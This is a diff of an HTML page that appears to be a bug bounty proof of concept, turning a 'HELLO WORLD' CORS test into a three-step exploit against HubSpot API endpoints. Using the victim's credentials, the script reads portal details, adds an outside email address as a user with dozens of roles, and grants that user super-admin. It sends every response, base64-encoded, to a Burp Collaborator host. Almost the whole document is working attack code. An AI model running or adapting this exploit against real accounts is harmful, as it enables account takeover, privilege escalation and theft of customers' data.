@@ -1,28 +1,140 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>HELLO WORLD</title>
-</head>
+<head><title>CORS 3-Step Exploit with Exfiltration</title></head>
 <body>
-  <h2>HELLO WORLD</h2>
-  <button onclick="exploit()">Run Exploit</button>
-  <pre id="output"></pre>
+<h1>CORS Exploit with Exfiltration</h1>
+<button onclick="runExploit()">Run Exploit</button>
+<pre id="log"></pre>
+<script>
+function log(msg) {
+  document.getElementById("log").textContent += msg + "\n";
+}
 
-  <script>
-    function exploit() {
-      var xhr = new XMLHttpRequest();
-      xhr.open("GET", "https://app-eu1.hubspot.com/api/login-verify/user-info", true); 
+// Send exfiltrated data to Burp Collaborator
+function exfil(stage, data) {
+  fetch("https://lj8nauln75agwganhs9ip0uwxn3dr2.oastify.com", {
+    method: "POST",
+    mode: "no-cors", // prevents CORS issues for sending data out
+    body: JSON.stringify({
+      stage: stage,
+      data: btoa(unescape(encodeURIComponent(data))) // base64 encode
+    })
+  });
+}
 
-      xhr.withCredentials = true; 
+function runExploit() {
+  // Step 1: GET portal info
+  const xhr1 = new XMLHttpRequest();
+  xhr1.open("GET", "https://api-eu1.hubspot.com/home/v2/api/portal", true);
+  xhr1.withCredentials = true;
+  xhr1.setRequestHeader("Content-Type", "application/json");
 
-      xhr.onreadystatechange = function () {
-        if (xhr.readyState === 4) {
-          document.getElementById("output").innerText = xhr.responseText;
+  xhr1.onreadystatechange = function () {
+    if (xhr1.readyState === XMLHttpRequest.DONE) {
+      log("[+] Step 1 - GET portal info response:");
+      log(xhr1.responseText);
+      exfil("step1-get-portal-info", xhr1.responseText);
+
+      let portalId = null;
+      try {
+        const json = JSON.parse(xhr1.responseText);
+        portalId = json.portalId || json.id;
+      } catch (e) {
+        log("[-] Failed to parse portalId.");
+        return;
+      }
+
+      if (!portalId) {
+        log("[-] No portalId found.");
+        return;
+      }
+
+      // Step 2: POST add user with role
+      const xhr2 = new XMLHttpRequest();
+      const postUrl = `https://app-eu1.hubspot.com/api/app-users/v1/users/add/bulk?portalId=${portalId}`;
+      xhr2.open("POST", postUrl, true);
+      xhr2.withCredentials = true;
+      xhr2.setRequestHeader("Content-Type", "application/json");
+
+      const userData = {
+        "users": [{ "email": "dangerhm+3@wearehackerone.com" }],
+        "seatNames": ["service-professional-trial"],
+        "teamId": null,
+        "secondaryTeamIds": [],
+        "sendWelcomeEmail": true,
+        "forceWelcomeEmail": true,
+        "roleNames": [
+          "campaigns-read", "crm-associations-write-accessor", "blog-read", "contacts-all-deleter",
+          "crm-importer", "custom-line-item-write", "connected-email-inbox-accessor", "social-publish-all",
+          "marketplace-asset-access", "buyer-intent-editor", "reporting-datasets-writer", "email-read",
+          "crm-all-editor", "custom-views-editor", "service-base", "companies-all-deleter",
+          "sales-templates-write", "marketing-reporting-access", "contacts-base", "companies-all-editor",
+          "crm-all-viewer", "feedback-surveys-viewer", "companies-all-viewer", "reporting-base", "sales-base",
+          "ads-read", "crm-all-deal-editor", "crm-all-ticket-editor", "user-permission-page-viewer",
+          "crm_hubspot_object:0-1:creator", "crm_hubspot_object:0-2:creator", "deals-all-deleter",
+          "tickets-all-deleter", "reporting-datasets-reader", "landingpages-read",
+          "crm_hubspot_object:0-3:creator", "file-manager-deleter", "url-redirects-reader",
+          "crm_hubspot_object:0-5:creator", "marketing-base", "crm-all-deal-viewer", "crm-all-ticket-viewer",
+          "tasks-all-editor", "chatspot-accessor", "contacts-all-communicator", "lists-access",
+          "tasks-all-viewer", "reporting-create-and-own", "forms-publisher", "file-manager-editor",
+          "pages-read", "service-professional"
+        ]
+      };
+
+      xhr2.onreadystatechange = function () {
+        if (xhr2.readyState === XMLHttpRequest.DONE) {
+          log("\n[+] Step 2 - POST add user response:");
+          log(xhr2.responseText);
+          exfil("step2-post-add-user", xhr2.responseText);
+        
+        let userId = null;
+        try {
+            const resp = JSON.parse(xhr2.responseText);
+            // Try to extract ID (adjust path if needed)
+            userId = resp.id || (resp.user && resp.user.id) || (Array.isArray(resp) && resp[0] && resp[0].id);
+        } catch (e) {
+          log("[-] Failed to parse user ID from step 2.");
+          return;
+        }
+
+    if (!userId) {
+      log("[-] No user ID found in step 2 response.");
+      return;
+    }
+          // Step 3: PUT update something
+          const xhr3 = new XMLHttpRequest();
+          const putUrl = `https://app-eu1.hubspot.com/api/app-users/v1/users/permissions-and-seats/bulk?portalId=${portalId}`;
+          xhr3.open("PUT", putUrl, true);
+          xhr3.withCredentials = true;
+          xhr3.setRequestHeader("Content-Type", "application/json");
+
+          const putData = [{
+            "userId": userId,
+            "roles": [
+                "sequences-write", "buyer-intent-viewer", "core-seat-base",
+                "sequences-bulk-enroll-write", "super-admin", "service-professional"
+            ],
+            "seatNames": ["service-professional-trial"]
+    }];
+
+          xhr3.onreadystatechange = function () {
+            if (xhr3.readyState === XMLHttpRequest.DONE) {
+              log("\n[+] Step 3 - PUT update response:");
+              log(xhr3.responseText);
+              exfil("step3-put-settings", xhr3.responseText);
+            }
+          };
+
+          xhr3.send(JSON.stringify(putData));
         }
       };
 
-      xhr.send();
+      xhr2.send(JSON.stringify(userData));
     }
-  </script>
+  };
+
+  xhr1.send();
+}
+</script>
 </body>
 </html>
